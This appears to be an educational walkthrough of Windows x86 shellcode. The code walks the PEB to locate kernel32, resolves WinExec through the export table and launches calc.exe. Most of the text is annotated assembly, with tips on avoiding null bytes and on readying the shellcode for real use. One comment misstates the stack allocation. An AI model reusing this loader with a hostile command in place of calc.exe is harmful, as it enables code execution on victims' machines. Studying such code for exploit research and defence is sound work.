# Shellcode Walkthrough — PEB → kernel32 → WinExec("calc.exe")

## Execution Flow

```
_start → main → find_module → get_export_directory → get_export_tables
       → save_export_context → find_winexec_literal → call_winexec
```

---

## `_start`

```nasm
_start:
    jmp main        ; skip all subroutines, jump directly to main entry point
```

---

## `find_module`

Orchestrates PEB traversal. Calls `get_first_ldr_entry` to land on the first
`_LDR_DATA_TABLE_ENTRY`, then falls through into `find_kernel32_entry` to walk
the list until kernel32 is found.

```nasm
find_module:
    call get_first_ldr_entry    ; pushes return address, jumps to subroutine
                                ; on ret: EAX = first LDR entry base
    jmp find_kernel32_entry     ; tail-call into the search loop
                                ; (no ret here — find_kernel32_entry will ret
                                ;  back to find_module's caller)
```

---

## `get_first_ldr_entry`

Walks `fs:[0x30]` → PEB → LDR → `InInitializationOrderModuleList` and returns
a pointer to the **first** `_LDR_DATA_TABLE_ENTRY` base.

```nasm
get_first_ldr_entry:
    xor ecx, ecx                ; ECX = 0  (avoids null byte from mov ecx, 0)
    mov eax, fs:[ecx + 0x30]    ; EAX = PEB *
                                ;   fs segment base = TEB
                                ;   TEB+0x30 = pointer to PEB
    mov eax, [eax + 0x0c]       ; EAX = PEB->Ldr  (PEB_LDR_DATA *)
                                ;   PEB+0x0C = Ldr field
    mov eax, [eax + 0x1c]       ; EAX = Ldr->InInitializationOrderModuleList.Flink
                                ;   LDR+0x1C = InInitializationOrderModuleList
                                ;   Flink points to (first_entry + 0x10)
    sub eax, 0x10               ; EAX = first _LDR_DATA_TABLE_ENTRY base
                                ;   InInitializationOrderLinks is at +0x10
                                ;   within the entry, so subtract to reach base
    ret                         ; return to find_module; EAX = entry base
```

---

## `find_kernel32_entry`

Checks the current LDR entry's `BaseDllName` for "KERNEL32" by comparing
individual UTF-16 characters at known offsets. On a match, loads `DllBase`
into EBX and returns. Otherwise advances to the next list entry via `next`.

> **Why these offsets into `BaseDllName`?**
> `BaseDllName` is a `UNICODE_STRING` at `entry+0x28` in full layout, but the
> code uses `entry+0x30` as the `Buffer` pointer directly. The checks target
> characters at positions 0, 1, and 6 of the wide string:
>
> | Index | Wide char | ASCII equiv |
> |-------|-----------|-------------|
> | 0     | `0x004B`  | `K`         |
> | 1     | `0x0045`  | `E`         |
> | 6     | `0x0033`  | `3`         |
>
> "KERNEL32.DLL" — checking K, E, and 3 (the '3' in "32") is enough to
> distinguish kernel32 from other loaded modules in a typical process.

```nasm
find_kernel32_entry:
    mov esi, [eax + 0x30]           ; ESI = BaseDllName.Buffer (UNICODE_STRING.Buffer)
                                    ;   entry+0x30 = Buffer pointer of BaseDllName
                                    ;   points to wide-char string e.g. L"KERNEL32.DLL"
    cmp word ptr [esi], 0x004b      ; does char[0] == L'K'?
    jne next                        ; no → try next entry
    cmp word ptr [esi+2], 0x0045    ; does char[1] == L'E'?
                                    ;   +2 bytes = second wide char (UTF-16LE, 2 bytes each)
    jne next                        ; no → try next entry
    cmp word ptr [esi+12], 0x0033   ; does char[6] == L'3'?
                                    ;   +12 bytes = 7th wide char (byte offset = index * 2)
                                    ;   '3' in "KERNEL32" — confirms this is kernel32 not kernelbase
    jne next                        ; no → try next entry

    mov ebx, [eax + 0x18]           ; EBX = entry->DllBase
                                    ;   entry+0x18 = DllBase field
                                    ;   this is the module load address (VA)
    ret                             ; return to find_module's caller
                                    ;   EBX = kernel32 base for all subsequent use
```

---

## `next`

Advances to the next `_LDR_DATA_TABLE_ENTRY` in `InInitializationOrderModuleList`
and re-enters the check loop.

```nasm
next:
    mov eax, [eax + 0x10]   ; EAX = InInitOrderLinks.Flink of current entry
                             ;   entry+0x10 = InInitializationOrderLinks.Flink
                             ;   points to (next_entry + 0x10)
    sub eax, 0x10            ; EAX = next entry base  (same adjustment as get_first_ldr_entry)
    jmp find_kernel32_entry  ; loop back and check this entry
```

> **No termination guard here.** If kernel32 is not found, this loops until
> a null or invalid Flink causes a crash. Safe assumption for shellcode in a
> standard process.

---

## `get_export_directory`

Parses the PE headers of the module in EBX to locate its
`IMAGE_EXPORT_DIRECTORY`. Returns a pointer to it in EAX.

```nasm
get_export_directory:
    mov eax, [ebx+0x3c]     ; EAX = IMAGE_DOS_HEADER.e_lfanew
                             ;   DllBase+0x3C = e_lfanew (RVA to IMAGE_NT_HEADERS)
    add eax, ebx            ; EAX = IMAGE_NT_HEADERS VA
                             ;   RVA → VA by adding module base
    mov eax, [eax+0x78]     ; EAX = DataDirectory[0].VirtualAddress
                             ;   NT_HEADERS+0x78 = OptionalHeader+0x60
                             ;                   = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                             ;   this is an RVA to IMAGE_EXPORT_DIRECTORY
    add eax, ebx            ; EAX = IMAGE_EXPORT_DIRECTORY VA
                             ;   RVA → VA
    ret                      ; EAX = export directory pointer
```

---

## `get_export_tables`

Extracts the three export arrays and the name count from `IMAGE_EXPORT_DIRECTORY`
(EAX), converting all RVAs to VAs using the module base in EBX.

```nasm
get_export_tables:
    mov ecx, [eax+0x18]     ; ECX = NumberOfNames
                             ;   ExportDir+0x18 = NumberOfNames (DWORD)
                             ;   count of named exports; bounds the name search loop

    mov edi, [eax+0x20]     ; EDI = AddressOfNames RVA
                             ;   ExportDir+0x20 = AddressOfNames field
    add edi, ebx            ; EDI = AddressOfNames VA
                             ;   DWORD[] of RVAs, one per named export
                             ;   AddressOfNames[i] → RVA to null-terminated name string

    mov edx, [eax+0x24]     ; EDX = AddressOfNameOrdinals RVA
                             ;   ExportDir+0x24 = AddressOfNameOrdinals field
    add edx, ebx            ; EDX = AddressOfNameOrdinals VA
                             ;   WORD[] parallel to AddressOfNames
                             ;   AddressOfNameOrdinals[i] → index into AddressOfFunctions[]

    mov esi, [eax+0x1c]     ; ESI = AddressOfFunctions RVA
                             ;   ExportDir+0x1C = AddressOfFunctions field
    add esi, ebx            ; ESI = AddressOfFunctions VA
                             ;   DWORD[] of function RVAs
                             ;   AddressOfFunctions[ordinal] → RVA to function code

    ret                      ; ECX/EDI/EDX/ESI all set; EBX still = DllBase
```

---

## `save_export_context`

Spills all export resolution state into EBP-relative stack slots so the
registers are free to use as scratch during the name search.

```nasm
save_export_context:
    mov [ebp-0x04], ebx     ; slot -0x04 = DllBase
                             ;   needed to convert all RVAs → VAs throughout resolution
    mov [ebp-0x08], edi     ; slot -0x08 = AddressOfNames VA
                             ;   reloaded at start of every loop iteration
    mov [ebp-0x0c], edx     ; slot -0x0c = AddressOfNameOrdinals VA
                             ;   used after name match to find ordinal
    mov [ebp-0x10], esi     ; slot -0x10 = AddressOfFunctions VA
                             ;   used after ordinal lookup to find function RVA
    mov [ebp-0x14], ecx     ; slot -0x14 = NumberOfNames
                             ;   loop upper bound
    ret
```

### EBP Frame Map (after `save_export_context`)

```
[ebp - 0x04]  DllBase                  (kernel32 load address)
[ebp - 0x08]  AddressOfNames VA        (DWORD[] of name RVAs)
[ebp - 0x0c]  AddressOfNameOrdinals VA (WORD[] of ordinals)
[ebp - 0x10]  AddressOfFunctions VA    (DWORD[] of function RVAs)
[ebp - 0x14]  NumberOfNames            (loop bound)
[ebp - 0x18]  WinExec VA               (written by found:)
```

---

## `find_winexec_literal`

Walks `AddressOfNames` from index 0 upward, comparing each export name against
the literal bytes of "WinExec\0" using two 4-byte comparisons.

```nasm
find_winexec_literal:
    xor ecx, ecx            ; ECX = 0 (name index, starts at first entry)

find_winexec_loop:
    mov edi, [ebp - 0x08]   ; EDI = AddressOfNames VA  (reload each iteration)
    mov eax, [edi + ecx*4]  ; EAX = AddressOfNames[ecx]  (RVA to name string)
                             ;   each entry is a DWORD (4 bytes), hence *4
    add eax, [ebp - 0x04]   ; EAX = name string VA
                             ;   RVA + DllBase = absolute address of ASCII name

    cmp dword ptr [eax], 0x456e6957     ; compare first 4 bytes against 'WinE'
                                         ;   little-endian: 57 69 6E 45 = 'W','i','n','E'
    jne go_next                          ; no match → advance index

    cmp dword ptr [eax+4], 0x00636578   ; compare bytes 4-7 against 'xec\0'
                                         ;   little-endian: 78 65 63 00 = 'x','e','c','\0'
                                         ;   the null terminator is the 4th byte;
                                         ;   this also rules out "WinExecSomethingElse"
    je found                             ; both match → ECX = correct name index

go_next:
    inc ecx                 ; advance to next name
    cmp ecx, [ebp - 0x14]  ; ECX < NumberOfNames?
    jl find_winexec_loop    ; yes → keep searching
                            ; falling through here = function not found (no handler)
```

---

## `found`

Converts the matched name index (ECX) to a function VA using the ordinal
indirection: `Names[i]` → `NameOrdinals[i]` → `Functions[ordinal]` → VA.

```nasm
found:
    mov edx, [ebp - 0x0c]          ; EDX = AddressOfNameOrdinals VA
    movzx eax, word ptr [edx + ecx*2]  ; EAX = NameOrdinals[ecx]  (WORD, zero-extended)
                                        ;   WORD array → *2 for byte offset
                                        ;   movzx prevents dirty high-word corruption
                                        ;   this ordinal is an unbiased index into Functions[]

    mov esi, [ebp - 0x10]          ; ESI = AddressOfFunctions VA
    mov eax, [esi + eax*4]         ; EAX = Functions[ordinal]  (RVA to WinExec)
                                    ;   DWORD array → *4 for byte offset
    add eax, [ebp - 0x04]          ; EAX = WinExec VA
                                    ;   RVA + DllBase = absolute function address

    mov [ebp - 0x18], eax          ; save WinExec VA to frame slot -0x18
    ret
```

---

## `call_winexec`

Builds the string `"calc.exe\0"` on the stack and calls `WinExec` with it.

```nasm
call_winexec:
    xor eax, eax            ; EAX = 0  (null terminator + avoids null bytes in shellcode)
    push eax                ; push null DWORD → terminates the string on the stack
    push 0x6578652e         ; push ".exe"  (little-endian: 2e 65 78 65 = '.','e','x','e')
    push 0x636c6163         ; push "calc"  (little-endian: 63 61 6c 63 = 'c','a','l','c')
                            ; stack now contains: "calc.exe\0" at ESP
    mov esi, esp            ; ESI = pointer to "calc.exe\0" string

    push 1                  ; push uCmdShow = SW_SHOWNORMAL (1)
    push esi                ; push lpCmdLine = "calc.exe"

    int3                    ; DEBUG BREAKPOINT — remove before deployment
                            ; inserted here to inspect stack/registers before the call

    call dword ptr [ebp - 0x18]  ; CALL WinExec(lpCmdLine="calc.exe", uCmdShow=1)
                                  ;   WinExec signature: UINT WinExec(LPCSTR, UINT)
                                  ;   stdcall: callee cleans args — stack restored on ret
    ret
```

> **Stack layout at the `call`:**
>
> ```
> esp+0x00  → "calc.exe\0"  pointer (lpCmdLine)
> esp+0x04  → 1             (uCmdShow = SW_SHOWNORMAL)
> esp+0x08  → "calc.exe\0"  string bytes (on stack)
> ```
>
> `WinExec` is `stdcall` — it pops its own arguments. No caller cleanup needed.

---

## `main`

Entry point. Sets up the EBP frame, allocates stack space for local slots,
then calls each subroutine in sequence.

```nasm
main:
    mov ebp, esp            ; EBP = current stack pointer
                            ;   establishes the frame base for all [ebp-N] slots

    add esp, 0xfffff9f9     ; esp -= 0x607  (two's complement: 0x100000000 - 0xfffff9f9 = 0x607)
                            ;   allocates ~24 bytes of stack space below EBP for local slots
                            ;   avoids a negative immediate (which would contain null bytes)

    call find_module        ; → EBX = kernel32 DllBase
    call get_export_directory   ; EAX → IMAGE_EXPORT_DIRECTORY VA  (uses EBX)
    call get_export_tables      ; ECX/EDI/EDX/ESI populated         (uses EAX, EBX)
    call save_export_context    ; spill ECX/EDI/EDX/ESI/EBX → [ebp-N] slots
    call find_winexec_literal   ; → [ebp-0x18] = WinExec VA
    call call_winexec           ; WinExec("calc.exe", 1)
    int3                        ; breakpoint / graceful stop in debugger
```

---

## `hang`

Infinite loop. Prevents execution falling off into unmapped memory if the
`int3` in `main` is not handled and execution continues.

```nasm
hang:
    jmp hang                ; spin forever
```

---

## Notes & Issues

### `int3` in `call_winexec`
The `int3` before the `call` is a **debug artifact** — it was left in to allow
inspection of the stack and registers immediately before `WinExec` is invoked.
Remove it before using the shellcode in any real context.

### Module Detection Heuristic
Checking only characters at positions 0 (`K`), 1 (`E`), and 6 (`3`) is
lightweight but fragile. A module named "KERNEL33.DLL" or similar would pass.
Sufficient for standard shellcode targets; not a robust general-purpose check.

### No Not-Found Handler
`find_winexec_loop` falls through if `NumberOfNames` is exhausted without a
match. Execution continues into whatever follows `found:` with a stale ECX.
In production shellcode this should `jmp hang` or `int3` to fail cleanly.

### Stack Allocation (`add esp, 0xfffff9f9`)
The negative allocation uses addition with a large unsigned immediate to avoid
a `sub esp, N` with a null byte in the encoding. `0xfffff9f9` = -1543 in
two's complement, so ESP moves down by 0x607 (1543) bytes — far more than the
6 slots (24 bytes) actually used. Common shellcode idiom; wastes stack space
but has no functional impact.